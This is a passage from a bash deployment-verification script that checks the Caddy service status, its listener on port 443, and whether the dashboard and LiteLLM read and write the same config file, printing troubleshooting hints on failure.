if [ "$CADDY_ACTIVE" != "active" ]; then
  echo "✗ caddy service is ${CADDY_ACTIVE} — check journalctl -u caddy"
  DEPLOY_OK=0
fi
if [ -z "$CADDY_443" ]; then
  echo "✗ caddy is not listening on :443 — check /etc/caddy/Caddyfile and journalctl -u caddy"
  DEPLOY_OK=0
fi
if [ "$CONFIG_PATH_OK" != "1" ]; then
  echo "✗ config path mismatch — dashboard writes and litellm reads do not resolve to the same file"
  echo "    dashboard:    $DASH_CFG"
  echo "    litellm read: $LL_CFG"
  echo "    unit Exec:    ${LL_EXEC_RESOLVED:-not-installed}"
  echo "    Symlink standalone/litellm → ../../litellm should be in place; check deploy-prod.sh."
  DEPLOY_OK=0
